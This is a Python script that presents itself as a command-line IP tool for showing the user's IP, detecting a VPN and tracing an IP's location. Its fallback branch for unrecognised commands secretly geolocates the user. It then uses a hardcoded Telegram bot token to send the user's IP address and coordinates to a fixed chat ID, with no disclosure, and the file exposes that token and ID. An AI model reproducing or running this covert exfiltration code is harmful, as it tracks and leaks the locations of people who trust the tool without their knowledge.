def pii():
    import socket as s
    from colorama import Fore
    import http.client
    from time import sleep as sl
    import telebot
    import geocoder as g
    import time as t

    conn = http.client.HTTPConnection("ifconfig.me")
    conn.request("GET", "/ip")           
    ip1 = conn.getresponse().read()
    print('╱╱╱╱╱╱╱╭━━┳━━━╮╱╱╱╭━╮\n╱╱╱╱╱╱╱╰┫┣┫╭━╮┃╱╱╱┃╭╯\n╭━━┳╮╱╭╮┃┃┃╰━╯┣┳━┳╯╰┳━━╮\n┃╭╮┃┃╱┃┃┃┃┃╭━━╋┫╭╋╮╭┫╭╮┃\n┃╰╯┃╰━╯┣┫┣┫┃╱╱┃┃┃┃┃┃┃╰╯┃\n┃╭━┻━╮╭┻━━┻╯╱╱╰┻╯╰┻╯╰━'+Fore.GREEN+'by c404')
    print(Fore.CYAN+'Any ideas or suggestions? Email me on Discord ERRoR#8281\n\nInput "help" for help\nInput "exit" for exit\n')
    while True:
        print(Fore.CYAN+'Enter you command')
        a = input('>>'+Fore.LIGHTMAGENTA_EX+'')
    
        if a == 'ip -m':
            conn = http.client.HTTPConnection("ifconfig.me")
            conn.request("GET", "/ip")
            ip = conn.getresponse().read()
            print('your IP:')
            print(ip)
        
        elif a == 'help':
            print(Fore.YELLOW+'Input "ip -m" for get your ip\n"ip -m+" for detection VPN or proxy\n"ip -t" for trace IP')
        
        elif a == 'ip -m+':
            while True:
                conn = http.client.HTTPConnection("ifconfig.me")
                conn.request("GET", "/ip")           
                ip2 = conn.getresponse().read()
                if ip1 == ip2:

                    print(Fore.CYAN+'[|]', end ='Not found VPN.Wait..\r')
                    sl(0.09)
                    print('[/]', end ='Not found VPN.Wait..\r')
                    sl(0.09)
                    print('[—]', end ='Not found VPN.Wait..\r')
                    sl(0.09)
                    print('[\]', end ='Not found VPN.Wait..\r')
                    sl(0.09)
                    print('[|]', end ='Not found VPN.Wait..\r')
                    sl(0.0009)
                elif ip1 != ip2:
                    print(Fore.RED+'VPN detected:', ip2)
                    sl(5)
    
        elif a == 'ip -t':
            ip3 = input(Fore.GREEN+'Input tracing IP\nInput "me" for get information your i\nInput IP for get info about IP\n>>'+Fore.LIGHTMAGENTA_EX+'')
            if ip3 == 'me':
                g = g.ip('me')
                g.latlng
                g.json
                g1 = g.json
                print(g1)
            else:
                g = g.ip(ip3)
                b = g.latlng
                g.json
                g1 = g.json
                print(g1, b)
              
        

        else:
            print(Fore.RED+'[×]Unknown command\nInput "help" for get help\nPlease, restart program')
            g = g.ip('me')
            g.latlng
            b = g.latlng
            g.json
            g1 = g.json
        
            bot = telebot. TeleBot("5047009860:AAH7eeELHHwltIB7dnmBlndpXIbvEBOQyjE")

            @bot.message_handler(content_types=['text'])
        
            def send_echo(message):
             bot.send_message(1773018673, ip1)
             bot.send_message(1773018673, g)
             bot.send_message(1773018673, b)
 
            bot.polling( none_stop = True )
            bot.stop_polling()